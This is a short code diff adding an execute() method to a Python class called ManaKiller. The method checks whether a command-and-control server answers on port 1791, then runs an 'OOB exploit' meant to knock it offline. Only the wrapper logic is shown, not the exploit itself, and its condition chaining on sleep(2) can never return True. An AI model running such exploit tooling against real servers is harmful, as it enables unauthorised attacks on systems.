@@ -55,4 +55,13 @@ class ManaKiller:
             except:
                 return
             
+    def execute(self: object) -> bool | None:
+        """Execute OOB exploit.
         
+            Return: bool
+        """
+        # NOTE: Verify whether the CNC is running on port 1791.
+        if self.exploit():
+            # NOTE: Execute exploit.
+            if self.exploit(attack = True) and sleep(2) and not self.exploit():
+                return True
